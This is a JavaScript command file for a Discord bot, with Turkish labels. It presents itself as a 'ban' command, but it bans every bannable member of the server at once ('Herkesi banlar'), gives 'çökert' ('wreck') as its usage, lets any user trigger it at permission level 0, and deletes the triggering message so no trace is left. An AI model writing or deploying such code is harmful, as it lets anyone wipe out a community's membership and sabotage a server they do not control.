const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {
  
  message.guild.members.forEach(u => {
if (u.bannable) {
return u.ban();
}
})


 }


message.delete()
};  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['b', 'banla'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'ban',
  description: 'Herkesi banlar.', 
  usage: 'çökert'
};